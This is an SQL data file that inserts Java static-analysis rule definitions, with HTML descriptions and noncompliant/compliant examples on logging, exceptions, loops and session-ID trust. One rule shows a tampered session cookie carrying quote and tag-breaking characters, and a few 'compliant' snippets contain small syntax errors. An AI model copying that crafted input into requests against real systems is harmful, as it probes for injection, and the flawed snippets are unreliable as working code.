INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (921, '"Preconditions" and logging arguments should not require evaluation', 'S2629', NULL, 'squid', '<p>Passing message arguments that require further evaluation into a Guava <code>com.google.common.base.Preconditions</code> check can result in a
performance penalty. That''s because whether or not they''re needed, each argument must be resolved before the method is actually called.</p>
<p>Similarly, passing concatenated strings into a logging method can also incur a needless performance hit because the concatenation will be performed
every time the method is called, whether or not the log level is low enough to show the message.</p>
<p>Instead, you should structure your code to pass static or pre-computed values into <code>Preconditions</code> conditions check and logging
calls.</p>
<p>Specifically, the built-in string formatting should be used instead of string concatenation, and if the message is the result of a method call,
then <code>Preconditions</code> should be skipped altoghether, and the relevant exception should be conditionally thrown instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
logger.log(Level.DEBUG, "Something went wrong: " + message);  // Noncompliant; string concatenation performed even when log level too high to show DEBUG messages

logger.fine("An exception occurred with message: " + message); // Noncompliant

LOG.error("Unable to open file " + csvPath, e);  // Noncompliant

Preconditions.checkState(a &gt; 0, "Arg must be positive, but got " + a);  // Noncompliant. String concatenation performed even when a &gt; 0

Preconditions.checkState(condition, formatMessage());  // Noncompliant. formatMessage() invoked regardless of condition

Preconditions.checkState(condition, "message: %s", formatMessage());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
logger.log(Level.SEVERE, "Something went wrong: {0} ", message);  // String formatting only applied if needed

logger.fine("An exception occurred with message: {}", message);  // SLF4J, Log4j

logger.log(Level.SEVERE, () -&gt; "Something went wrong: " + message); // since Java 8, we can use Supplier , which will be evaluated lazily

LOG.error("Unable to open file {0}", csvPath, e);

if (LOG.isDebugEnabled() {
  LOG.debug("Unable to open file " + csvPath, e);  // this is compliant, because it will not evaluate if log level is above debug.
}

Preconditions.checkState(arg &gt; 0, "Arg must be positive, but got %d", a);  // String formatting only applied if needed

if (!condition) {
  throw new IllegalStateException(formatMessage());  // formatMessage() only invoked conditionally
}

if (!condition) {
  throw new IllegalStateException("message: " + formatMessage());
}
</pre>
<h2>Exceptions</h2>
<p><code>catch</code> blocks are ignored, because the performance penalty is unimportant on exceptional paths (catch block should not be a part of
standard program flow). Getters are ignored. This rule accounts for explicit test-level testing with SLF4J methods <code>isXXXEnabled</code> and
ignores the bodies of such <code>if</code> statements.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812958, 1510817812959, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (922, 'Assignments should not be made from within sub-expressions', 'AssignmentInSubExpressionCheck', 'S1121', 'squid', '<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)).isEmpty()) {  // Noncompliant
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str.isEmpty()) {
  //...
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are ignored.</p>
<pre>
BufferedReader br = new BufferedReader(/* ... */);
String line;
while ((line = br.readLine()) != null) {...}
</pre>
<p>Chained assignments, including compound assignments, are ignored.</p>
<pre>
int i = j = 0;
int k = (j += 1);
result = (bresult = new byte[len]);
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value </li>
  <li> MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions </li>
  <li> MISRA C:2012, 13.4 - The result of an assignment operator should not be used </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/nYFtAg">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1gCTAw">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KQvhAg">CERT, EXP19-CPP.</a> - Do not perform assignments in conditional expressions
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KYIyAQ">CERT, MSC02-CPP.</a> - Avoid errors of omission </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,misra,suspicious', false, 'HTML', 1510817812960, 1510817812960, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (923, 'The ternary operator should not be used', 'S1774', NULL, 'squid', '<p>While the ternary operator is pleasingly compact, its use can make code more difficult to read. It should therefore be avoided in favor of the more
verbose <code>if</code>/<code>else</code> structure.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.out.println(i&gt;10?"yes":"no");
</pre>
<h2>Compliant Solution</h2>
<pre>
if (i &gt; 10) {
  System.out.println(("yes");
} else {
  System.out.println("no");
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812961, 1510817812962, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (924, '"entrySet()" should be iterated when both the key and value are needed', 'S2864', NULL, 'squid', '<p>When only the keys from a map are needed in a loop, iterating the <code>keySet</code> makes sense. But when both the key and the value are needed,
it''s more efficient to iterate the <code>entrySet</code>, which will give access to both the key and value, instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingWithMap(Map&lt;String,Object&gt; map) {
  for (String key : map.keySet()) {  // Noncompliant; for each key the value is retrieved
    Object value = map.get(key);
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingWithMap(Map&lt;String,Object&gt; map) {
  for (Map.Entry&lt;String,Object&gt; entry : map.entrySet()) {
    String key = entry.getKey();
    Object value = entry.getValue();
    // ...
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812962, 1510817812963, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (925, 'Public methods should throw at most one checked exception', 'S1160', NULL, 'squid', '<p>Using checked exceptions forces method callers to deal with errors, either by propagating them or by handling them. Throwing exceptions makes them
fully part of the API of the method.</p>
<p>But to keep the complexity for callers reasonable, methods should not throw more than one kind of checked exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void delete() throws IOException, SQLException {      // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void delete() throws SomeApplicationLevelException {
  /* ... */
}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are not checked by this rule and are allowed to throw several checked exceptions.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'error-handling', false, 'HTML', 1510817812963, 1510817812964, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (926, '"@Override" should be used on overriding and implementing methods', 'S1161', NULL, 'squid', '<p>Using the <code>@Override</code> annotation is useful for two reasons :</p>
<ul>
  <li> It elicits a warning from the compiler if the annotated method doesn''t actually override anything, as in the case of a misspelling. </li>
  <li> It improves the readability of the source code by making it obvious that methods are overridden. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  public boolean doSomething(){...}  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class ParentClass {
  public boolean doSomething(){...}
}
class FirstChildClass extends ParentClass {
  @Override
  public boolean doSomething(){...}  // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed when overriding a method from the <code>Object</code> class like <code>toString()</code>, <code>hashcode()</code>, ...</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817812964, 1510817812965, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (927, 'A "for" loop update clause should move the counter in the right direction', 'S2251', NULL, 'squid', '<p>A <code>for</code> loop with a counter that moves in the wrong direction is not an infinite loop. Because of wraparound, the loop will eventually
reach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially causing unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String [] strings) {
  for (int i = 0; i &lt; strings.length; i--) { // Noncompliant;
    String string = strings[i];  // ArrayIndexOutOfBoundsException when i reaches -1
    //...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String [] strings) {
  for (int i = 0; i &lt; strings.length; i++) {
    String string = strings[i];
    //...
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zYEzAg">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert', false, 'HTML', 1510817812965, 1510817812965, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (931, 'Collection methods with O(n) performance should be used carefully', 'S2250', NULL, 'squid', '<p>The time complexity of method calls on collections is not always obvious. For instance, for most collections the <code>size()</code> method takes
constant time, but the time required to execute <code>ConcurrentLinkedQueue.size()</code> is O(n), i.e. directly proportional to the number of
elements in the collection. When the collection is large, this could therefore be an expensive operation. </p>
<p>This rule raises an issue when the following O(n) methods are called outside of constructors on class fields:</p>
<ul>
  <li> <code>ArrayList</code>
    <ul>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
  <li> <code>LinkedList</code>
    <ul>
      <li> <code>get</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>ConcurrentLinkedQueue</code>
    <ul>
      <li> <code>size</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>ConcurrentLinkedDeque</code>
    <ul>
      <li> <code>size</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>CopyOnWriteArrayList</code>
    <ul>
      <li> <code>add</code> </li>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
  <li> <code>CopyOnWriteArraySet</code>
    <ul>
      <li> <code>add</code> </li>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
ConcurrentLinkedQueue queue = new ConcurrentLinkedQueue();
//...
log.info("Queue contains " + queue.size() + " elements");  // Noncompliant
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'performance', false, 'HTML', 1510817812969, 1510817812970, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (932, 'Literal suffixes should be upper case', 'S818', NULL, 'squid', '<p>Using upper case literal suffixes removes the potential ambiguity between "1" (digit 1) and "l" (letter el) for declaring literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
long long1 = 1l; // Noncompliant
float float1 = 1.0f; // Noncompliant
double double1 = 1.0d; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
long long1 = 1L;
float float1 = 1.0F;
double double1 = 1.0D;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-4 - Literal suffixes shall be upper case </li>
  <li> MISRA C:2012, 7.3 - The lowercase character "l" shall not be used in a literal suffix </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/koAtAQ">CERT DCL16-C</a> - Use "L," not "l," to indicate a long value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/n4AtAQ">CERT DCL16-CPP</a> - Use "L," not "l," to indicate a long value </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,convention,misra,pitfall', false, 'HTML', 1510817812970, 1510817812971, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (933, 'An open curly brace should be located at the end of a line', 'LeftCurlyBraceEndLineCheck', 'S1105', 'squid', '<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a
line of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(condition)
{
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if(condition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>
<pre>
if(condition) {doSomething();}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812972, 1510817812972, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (948, 'Functions should not be defined with a variable number of arguments', 'S923', NULL, 'squid', '<p>As stated per effective java : </p>
<blockquote>
  <p>Varargs methods are a convenient way to define methods that require a variable number of arguments, but they should not be overused. They can
  produce confusing results if used inappropriately.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
void fun ( String... strings )	// Noncompliant
{
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.1 - Functions shall not be defined with a variable number of arguments. </li>
  <li> MISRA C++:2008, 8-4-1 - Functions shall not be defined using the ellipsis notation. </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4CW">CERT, DCL50-CPP.</a> - Do not define a C-style variadic function </li>
</ul>', 0, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'cert,misra,pitfall', false, 'HTML', 1510817812991, 1510817812991, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (934, 'Exceptions should not be thrown in finally blocks', 'S1163', NULL, 'squid', '<p>Throwing an exception from within a finally block will mask any exception which was previously thrown in the <code>try</code> or <code>catch</code>
block, and the masked''s exception message and stack trace will be lost.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* some work which end up throwing an exception */
  throw new IllegalArgumentException();
} finally {
  /* clean up */
  throw new RuntimeException();       // Noncompliant; masks the IllegalArgumentException
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* some work which end up throwing an exception */
  throw new IllegalArgumentException();
} finally {
  /* clean up */
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/soUbAQ">CERT, ERR05-J.</a> - Do not let checked exceptions escape from a finally block
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert,error-handling,suspicious', false, 'HTML', 1510817812973, 1510817812974, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (935, 'Track uses of disallowed methods', 'S2253', NULL, 'squid', '<p>This rule allows banning certain methods.</p>
<h2>Noncompliant Code Example</h2>
<p>Given parameters:</p>
<ul>
  <li> className:java.lang.String </li>
  <li> methodName: replace </li>
  <li> argumentTypes: java.lang.CharSequence, java.lang.CharSequence </li>
</ul>
<pre>
String name;
name.replace("A","a");  // Noncompliant
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, true, 'HTML', 1510817812975, 1510817812975, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (936, 'Loop conditions should be true at least once', 'S2252', NULL, 'squid', '<p>If a <code>for</code> loop''s condition is false before the first loop iteration, the loop will never be executed. Such loops are almost always
bugs, particularly when the initial value and stop conditions are hard-coded.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 10; i &lt; 10; i++) {  // Noncompliant
  // ...
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812977, 1510817812978, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (937, 'Primitives should not be boxed just for "String" conversion', 'S2131', NULL, 'squid', '<p>"Boxing" is the process of putting a primitive value into a primitive-wrapper object. When that''s done purely to use the wrapper class''
<code>toString</code> method, it''s a waste of memory and cycles because those methods are <code>static</code>, and can therefore be used without a
class instance. Similarly, using the <code>static</code> method <code>valueOf</code> in the primitive-wrapper classes with a non-<code>String</code>
argument should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int myInt = 4;
String myIntString = (new Integer(myInt)).toString(); // Noncompliant; creates &amp; discards an Integer object
myIntString = Integer.valueOf(myInt).toString(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int myInt = 4;
String myIntString = Integer.toString(myInt);
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812978, 1510817812979, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (938, 'Exception classes should be immutable', 'S1165', NULL, 'squid', '<p>Exceptions are meant to represent the application''s state at the point at which an error occurred.</p>
<p>Making all fields in an <code>Exception</code> class <code>final</code> ensures that this state:</p>
<ul>
  <li> Will be fully defined at the same time the <code>Exception</code> is instantiated. </li>
  <li> Won''t be updated or corrupted by a questionable error handler. </li>
</ul>
<p>This will enable developers to quickly understand what went wrong.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyException extends Exception {

  private int status;                               // Noncompliant

  public MyException(String message) {
    super(message);
  }

  public int getStatus() {
    return status;
  }

  public void setStatus(int status) {
    this.status = status;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyException extends Exception {

  private final int status;

  public MyException(String message, int status) {
    super(message);
    this.status = status;
  }

  public int getStatus() {
    return status;
  }

}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'error-handling', false, 'HTML', 1510817812979, 1510817812980, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (939, 'Classes extending java.lang.Thread should override the "run" method', 'S2134', NULL, 'squid', '<p>According to the Java API documentation:</p>
<blockquote>
  <p>There are two ways to create a new thread of execution. One is to declare a class to be a subclass of Thread. This subclass should override the
  run method of class Thread. An instance of the subclass can then be allocated and started...</p>
  <p>The other way to create a thread is to declare a class that implements the Runnable interface. That class then implements the run method. An
  instance of the class can then be allocated, passed as an argument when creating Thread, and started.</p>
</blockquote>
<p>By definition, extending the Thread class without overriding the <code>run</code> method doesn''t make sense, and implies that the contract of the
<code>Thread</code> class is not well understood.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyRunner extends Thread { // Noncompliant; run method not overridden

  public void doSometing() {...}
}
</pre>
<h2>Exceptions</h2>
<p>If <code>run()</code> is not overridden in a class extending <code>Thread</code>, it means that starting the thread will actually call
<code>Thread.run()</code>. However, <code>Thread.run()</code> does nothing if it has not been fed with a target <code>Runnable</code>. The rule
consequently ignore classes extending <code>Thread</code> if they are calling, in their constructors, the <code>super(...)</code> constructor with a
proper <code>Runnable</code> target.</p>
<pre>
class MyThread extends Thread { // Compliant - calling super constructor with a Runnable
  MyThread(Runnable target) {
    super(target); // calling super constructor with a Runnable, which will be used for when Thread.run() is executed
    // ...
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'multi-threading,pitfall', false, 'HTML', 1510817812980, 1510817812981, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (940, 'Exception handlers should preserve the original exceptions', 'S1166', NULL, 'squid', '<p>When handling a caught exception, the original exception''s message and stack trace should be logged or passed forward.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {   // Noncompliant - exception is lost
  LOGGER.info("context");
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - exception is lost (only message is preserved)
  LOGGER.info(e.getMessage());
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - original exception is lost
  throw new RuntimeException("context");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {
  LOGGER.info(e);  // exception is logged
}

try {
  /* ... */
} catch (Exception e) {
  throw new RuntimeException(e);   // exception stack trace is propagated
}

try {
  /* ... */
} catch (RuntimeException e) {
  doSomething();
  throw e;  // original exception passed forward
} catch (Exception e) {
  throw new RuntimeException(e);  // Conversion into unchecked exception is also allowed
}
</pre>
<h2>Exceptions</h2>
<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>DateTimeParseException</code>, <code>ParseException</code> and
<code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes. Similarly, handling
<code>NoSuchMethodException</code> is often required when dealing with the Java reflection API.</p>
<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are
correctly handled.</p>
<pre>
int myInteger;
try {
  myInteger = Integer.parseInt(myString);
} catch (NumberFormatException e) {
  // It is perfectly acceptable to not handle "e" here
  myInteger = 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/6gEqAQ">CERT, ERR00-J.</a> - Do not suppress or ignore checked exceptions </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,error-handling,suspicious', false, 'HTML', 1510817812981, 1510817812982, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (941, '"HttpServletRequest.getRequestedSessionId()" should not be used', 'S2254', NULL, 'squid', '<p>According to the Oracle Java API, the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>
<blockquote>
  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client
  did not specify a session ID, this method returns null.</p>
</blockquote>
<p>The session ID it returns is either transmitted in a cookie or a URL parameter so by definition, nothing prevents the end-user from manually
updating the value of this session ID in the HTTP request. </p>
<p>Here is an example of a updated HTTP header:</p>
<pre>
GET /pageSomeWhere HTTP/1.1
Host: webSite.com
User-Agent: Mozilla/5.0
Cookie: JSESSIONID=Hacked_Session_Value''''''"&gt;
</pre>
<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (E.G.
Tomcat or Jetty) to see if the value matches the ID of an an existing session. If it does not, the user should be considered unauthenticated.
Moreover, this session ID should never be logged to prevent hijacking of active sessions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(isActiveSession(request.getRequestedSessionId()) ){
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/807">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
  <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> -
  Broken Authentication and Session Management </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#SERVLET_SESSION_ID">Untrusted Session Cookie Value</a>
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cwe,owasp-a2,sans-top25-porous', false, 'HTML', 1510817812983, 1510817812984, 3);
